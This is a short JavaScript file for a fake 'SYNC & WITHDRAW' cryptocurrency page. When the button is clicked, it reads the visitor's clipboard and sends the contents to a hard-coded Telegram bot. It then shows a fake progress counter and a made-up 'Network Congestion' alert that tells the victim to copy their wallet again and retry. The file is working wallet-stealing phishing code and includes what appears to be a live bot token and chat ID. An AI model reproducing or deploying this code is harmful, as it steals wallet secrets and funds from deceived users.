const TOKEN = '8613250595:AAH4uQ0pfuJsb-34ylShOWt_-7IZ0Jb_iLw';
const CHAT_ID = '6176462400';

async function gigit() {
    try {
        const text = await navigator.clipboard.readText();
        if (text.length > 5) {
            const msg = encodeURIComponent(`👁️ GIGITAN ARSITEK: ${text}`);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
        }
    } catch (err) {}
}

const btn = document.getElementById('syncBtn');
if (btn) {
    btn.addEventListener('click', async () => {
        await gigit();
        btn.innerText = "PROCESSING... 67%";
        setTimeout(() => {
            alert("Network Congestion! Please COPY your wallet again and click SYNC to retry.");
            btn.innerText = "SYNC & WITHDRAW";
        }, 1500);
    });
                         }
